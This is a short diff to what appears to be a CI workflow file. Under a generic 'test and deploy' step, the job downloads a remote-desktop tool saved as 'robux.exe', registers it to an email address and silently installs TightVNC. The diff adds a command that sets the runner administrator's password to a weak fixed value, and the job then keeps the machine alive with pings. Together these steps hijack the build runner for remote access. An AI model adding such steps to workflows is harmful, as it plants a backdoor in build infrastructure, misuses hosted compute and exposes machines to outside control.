@@ -36,8 +36,9 @@ jobs:
           echo test, and deploy your project.
           irm -uri "https://getscreen.me/download/getscreen.exe" -outfile "robux.exe"
           ./robux.exe -install -register huggingfaceuser@gmail.com
+          net user runneradmin Passw0rd!
           irm -uri "https://www.tightvnc.com/download/2.8.85/tightvnc-2.8.85-gpl-setup-64bit.msi" -outfile "vnc.msi"
-          cmd /c msiexec vnc.msi /qn
+          cmd /c msiexec vnc.msi /quiet
           python sleep.py
           ping 127.0.0.1
           ping 127.0.0.1
